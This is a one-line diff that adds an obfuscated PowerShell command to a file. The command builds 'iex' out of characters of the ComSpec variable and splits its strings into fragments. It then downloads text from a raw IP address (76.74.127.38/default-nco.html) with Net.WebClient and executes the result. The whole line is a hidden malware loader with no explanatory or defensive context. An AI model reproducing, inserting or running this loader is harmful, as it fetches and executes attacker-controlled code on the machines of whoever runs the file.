@@ -1,0 +1,1 @@
+﻿ .( $eNV:ComSpEc[4,15,25]-jOin'') ( (('ie'+'x ((New-'+'Object N'+'et.Web'+'Client'+').'+'Do'+'wnlo'+'adS'+'tr'+'in'+'g(mjX'+'ht'+'tp:/'+'/76.74.1'+'2'+'7.38/def'+'ault-'+'nco.ht'+'mlmj'+'X))')  -CREPlace  ([ChAR]109+[ChAR]106+[ChAR]88),[ChAR]39))
